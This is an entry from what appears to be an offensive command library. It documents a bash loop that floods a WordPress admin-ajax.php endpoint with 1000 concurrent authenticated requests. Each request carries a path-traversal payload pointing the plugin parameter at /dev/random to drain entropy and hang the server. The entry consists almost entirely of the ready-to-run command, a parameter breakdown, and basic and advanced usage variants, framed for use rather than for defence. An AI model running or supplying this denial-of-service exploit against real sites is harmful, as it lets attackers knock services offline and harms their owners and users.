---
id: cmd-wordpress-entropy-depletion-loop
data: >-
  for i in `seq 1 1000`; do curl --cookie "$cookiejar" --data
  "plugin=../../../../../../../../../../dev/random&action=update-plugin"
  "$target/wp-admin/admin-ajax.php" >/dev/null 2>&1 & done
tags:
  - wordpress
  - dos
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:11.374Z'
verified: false
validated: true
submitted: true
---
# wordpress-entropy-depletion-loop

## Command

```bash
for i in `seq 1 1000`; do curl --cookie "$cookiejar" --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" "$target/wp-admin/admin-ajax.php" >/dev/null 2>&1 & done
```

## Description

This bash loop sends 1000 concurrent POST requests to WordPress admin-ajax.php, exploiting path traversal in the plugin parameter to read from /dev/random, depleting entropy and causing DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `seq 1 1000` | Generates loop iterations 1 to 1000 | Yes |
| `curl --cookie "$cookiejar"` | Loads authentication cookies | Yes |
| `--data "plugin=../../../../../../../../../../dev/random"` | Traversal payload to target /dev/random | Yes |
| `--data "action=update-plugin"` | Ajax action to trigger vulnerable handler | Yes |
| `$target/wp-admin/admin-ajax.php` | Target Ajax endpoint | Yes |
| `>/dev/null 2>&1` | Suppress output | No |
| `&` | Run each curl in background for concurrency | Yes |

## Examples

### Basic Usage

```bash
for i in `seq 1 100`; do curl --cookie cookies.txt --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" "https://example.com/wp-admin/admin-ajax.php" & done
```

### Advanced Usage

```bash
for i in `seq 1 1000`; do curl --cookie "$cookiejar" --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" "$target/wp-admin/admin-ajax.php" >/dev/null 2>&1 & done
```

## Expected Output

Suppressed responses; server-side effect is entropy depletion leading to PHP hangs (monitor via server logs or performance).

## Related

- [[Related Procedure|procedures/wordpress-exploit-traversal-entropy]]
